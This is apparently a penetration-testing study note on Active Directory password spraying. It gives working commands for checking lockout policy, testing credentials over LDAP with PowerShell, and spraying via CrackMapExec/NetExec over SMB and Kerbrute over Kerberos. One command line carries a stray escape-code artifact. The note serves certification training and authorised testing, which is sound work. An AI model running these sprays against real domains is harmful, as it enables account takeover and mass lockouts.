# AD Password Spraying

**Password spraying = try one/few likely passwords against many domain users**, instead of brute-forcing many passwords against one account.

> [!danger] Check lockout policy first
> Too many failed logons can lock user accounts and generate obvious alerts.

## 1. Check domain password / lockout policy

From a domain-joined Windows host:

```powershell
net accounts
```

Record:
- `Lockout threshold`
- `Lockout duration`
- `Lockout observation window`

Example logic from Chapter 22: if threshold = `5`, stay below it; after the observation window passes, failed-attempt counters may permit additional attempts.

> [!warning]
> Real users may also be failing logins, so do not assume every theoretical attempt is safe.

---

## 2. LDAP / ADSI spray — Windows

PowerShell can authenticate a supplied username/password against LDAP with `DirectoryEntry`.

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName

New-Object System.DirectoryServices.DirectoryEntry(
    $SearchString,
    "username",
    "Password123!"
)
```

Valid credentials create the DirectoryEntry successfully; invalid credentials raise an authentication error.

Chapter 22 uses `Spray-Passwords.ps1` to automate this while accounting for lockout settings:

```powershell
powershell -ep bypass
.[0m\Spray-Passwords.ps1 -Pass 'Password123!' -Admin

# Wordlist mode is also supported by the script:
# .\Spray-Passwords.ps1 -File .\passwords.txt
```

---

## 3. SMB spray — Kali

Chapter 22 uses CrackMapExec; NetExec is the modern equivalent in many Kali setups.

```bash
# Chapter 22 syntax
crackmapexec smb <DOMAIN_HOST_IP> \
  -u users.txt -p 'Password123!' -d corp.local --continue-on-success

# Common modern equivalent
nxc smb <DOMAIN_HOST_IP> \
  -u users.txt -p 'Password123!' -d corp.local --continue-on-success
```

Advantages:
- Clearly shows valid/invalid credentials.
- Also indicates whether the credential has **local administrative access** on the target (`Pwn3d!` in CME output).

Disadvantages:
- Full SMB connections make it **noisier and slower** than Kerberos-based validation.
- CME does **not automatically protect you from account lockouts**; inspect policy yourself first.

---

## 4. Kerberos spray — Kerbrute

Kerberos password validation can be performed by sending an AS-REQ and examining the KDC response.

```powershell
.\kerbrute_windows_amd64.exe passwordspray \
  -d corp.local .\usernames.txt "Password123!"
```

Kerbrute is cross-platform and is useful when you already have a username list.

> [!tip]
> If Kerbrute on Windows reports a network/file issue, Chapter 22 notes that the username file may need ANSI encoding.

---

## 5. Username sources

Build `users.txt` / `usernames.txt` from AD enumeration:

- [[Active Directory/Attack-Phases/Phase1-Enum|Phase 1 Enumeration]]
- [[Active Directory/PowerView & Manual AD Enumeration|PowerView & Manual AD Enumeration]]
- [[Active Directory/SharpHound & BloodHound|SharpHound & BloodHound]]

---

## OSCP workflow

```text
Enumerate users
    ↓
Check `net accounts`
    ↓
Choose 1 likely password
    ↓
Spray carefully
├─ LDAP / ADSI
├─ SMB / CME-NXC
└─ Kerberos / Kerbrute
    ↓
Valid credentials found
    ↓
Test privileges / access
    ↓
Re-enumerate AD as new identity
```

Also see [[Active Directory/Attack-Phases/Phase4-Pivot to MS02/Credential Spray — Across All Services (Chain)|Credential Spray — Across All Services]] for reusing already-discovered credentials against multiple hosts/services.
